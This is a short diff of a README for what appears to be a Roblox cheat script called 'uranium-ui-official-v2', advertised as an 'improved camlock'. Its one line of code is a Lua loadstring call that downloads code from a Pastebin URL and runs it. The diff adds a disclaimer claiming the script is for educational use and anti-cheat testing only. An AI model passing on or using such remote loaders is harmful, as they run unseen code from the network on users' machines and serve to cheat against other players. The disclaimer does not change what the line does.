@@ -1,3 +1,4 @@
 # uranium-ui-official-v2
-improved camlock
-loadstring(game:HttpGet("https://pastebin.com/raw/L6QjAJAD"))()
+improved camlock            
+        loadstring(game:HttpGet("https://pastebin.com/raw/L6QjAJAD"))()          
+          DISCLAIMER! THIS IS ONLY FOR EDUCATIONAL PURPOSES AND I DO NOT CONDONE THE USE OF THIS FOR CHEATING, THIS IS ONLY TO TEST ROBLOX ANTI CHEAT SYSTEM AND NOT FOR AN UNFAIR ADVANTAGE AGAINST OTHERS IN THE GAME ROBLOX!
